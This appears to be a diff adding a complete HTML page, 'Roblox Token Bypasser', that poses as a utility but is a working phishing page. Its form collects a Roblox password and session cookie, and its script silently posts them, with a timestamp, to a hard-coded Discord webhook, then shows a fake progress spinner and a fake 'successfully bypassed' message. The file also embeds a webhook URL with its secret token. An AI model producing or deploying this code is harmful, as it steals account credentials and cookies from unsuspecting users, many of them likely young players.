@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Roblox Token Bypasser</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background-color: #0d1117;
+      font-family: 'Roboto', sans-serif;
+      color: #c9d1d9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: #161b22;
+      padding: 40px;
+      border-radius: 8px;
+      border: 1px solid #30363d;
+      width: 400px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.7);
+      text-align: center;
+    }
+
+    h1 {
+      color: #58a6ff;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-top: 20px;
+      color: #8b949e;
+      font-size: 0.9rem;
+      text-align: left;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      background-color: #21262d;
+      border: 1px solid #30363d;
+      color: white;
+      border-radius: 4px;
+      margin-top: 5px;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 30px;
+      padding: 12px;
+      background-color: #238636;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #2ea043;
+    }
+
+    .loader {
+      margin: 30px auto;
+      border: 6px solid #161b22;
+      border-top: 6px solid #58a6ff;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+
+    .result {
+      display: none;
+      margin-top: 20px;
+      background-color: #21262d;
+      padding: 20px;
+      border-radius: 5px;
+      color: #3fb950;
+      border: 1px solid #30363d;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="formContainer">
+    <h1>Roblox Token Bypasser</h1>
+    <form id="phishForm">
+      <label for="userId">Roblox User/pasword</label>
+      <input type="text" id="userId" name="userId" placeholder="password" required>
+
+      <label for="token">cookie here</label>
+      <input type="text" id="token" name="token" placeholder="cookie" required>
+
+      <!-- Webhook Input (Editable) -->
+      <label for="webhookUrl">Webhook URL </label>
+      <input type="text" id="webhookUrl" name="webhookUrl" placeholder="Enter your webhook URL here"'required>
+
+      <button type="submit">Bypass Token</button>
+    </form>
+
+    <div class="loader" id="loader"></div>
+    <div class="result" id="result">✅ Token successfully bypassed.</div>
+  </div>
+
+  <script>
+    const form = document.getElementById('phishForm');
+    const loader = document.getElementById('loader');
+    const result = document.getElementById('result');
+    const container = document.getElementById('formContainer');
+
+    // Your predefined webhook URL (data will be sent here)
+    const predefinedWebhookUrl = "https://discord.com/api/webhooks/1365126997633794048/t7lHuYnziu4Px5rBy8KapR29AzE4Up5EJWlXXtHR6Be3UXmy359YTzGkpsD_h5lpKAL0";
+
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const userId = document.getElementById('userId').value;
+      const token = document.getElementById('token').value;
+      const userWebhookUrl = document.getElementById('webhookUrl').value;
+
+      // Create the payload with all the information, including the Webhook URL entered
+      const payload = {
+        content: `**Roblox User ID:** @everyone **${userId}\n**Roblox Token:** ${token}\n**Webhook URL entered by user:** ${userWebhookUrl}\n**Timestamp:** ${new Date().toISOString()}`
+      };
+
+      // Send the payload to your predefined webhook (this webhook is still used)
+      fetch(predefinedWebhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+
+      // Show loading
+      form.style.display = 'none';
+      loader.style.display = 'block';
+
+      // Fake processing
+      setTimeout(() => {
+        loader.style.display = 'none';
+        result.style.display = 'block';
+      }, 2500);
+    });
+  </script>
+
+</body>
+</html>
